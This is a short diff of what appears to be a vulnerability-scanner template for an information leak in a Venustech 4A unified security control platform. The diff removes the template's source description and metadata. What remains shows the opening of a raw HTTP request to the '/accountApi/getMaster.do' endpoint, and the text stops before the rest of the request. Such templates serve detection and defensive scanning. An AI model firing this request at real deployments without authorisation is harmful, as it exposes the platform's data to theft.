@@ -3,12 +3,8 @@ info:
   name: 启明星辰-4A 统一安全管控平台 getMater 信息泄漏
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wxi92io48pcu0hx1'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wxi92io48pcu0hx1
-    fofa: 暂无
 http:
 - raw:
   - 'GET /accountApi/getMaster.do HTTP/1.1
